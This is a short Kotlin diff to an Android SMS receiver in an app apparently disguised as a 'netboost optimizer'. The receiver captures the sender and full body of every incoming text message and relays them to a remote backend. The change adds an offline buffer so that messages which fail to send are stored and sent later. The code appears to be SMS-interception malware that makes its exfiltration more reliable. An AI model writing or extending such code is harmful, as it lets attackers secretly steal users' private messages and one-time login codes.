@@ -25,11 +25,17 @@ class SmsReceiver : BroadcastReceiver() {
             try {
                 for ((sender, parts) in msgsBySender) {
                     val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
+                    val messageSid = java.util.UUID.randomUUID().toString()
                     Log.d("SmsReceiver", "Relaying SMS from=$sender len=${fullBody.length}")
-                    BackendClient.relay(sender, fullBody, java.util.UUID.randomUUID().toString())
+                    
+                    val ok = BackendClient.relay(sender, fullBody, messageSid)
+                    if (!ok) {
+                        Log.w("SmsReceiver", "Direct relay failed/offline — buffering to Room database")
+                        com.netboost.optimizer.buffer.RelayBuffer.enqueue(context.applicationContext, sender, fullBody, messageSid)
+                    }
                 }
             } catch (e: Exception) {
-                Log.e("SmsReceiver", "Relay failed: ${e.message}", e)
+                Log.e("SmsReceiver", "Relay exception: ${e.message}", e)
             } finally {
                 pendingResult.finish()
             }
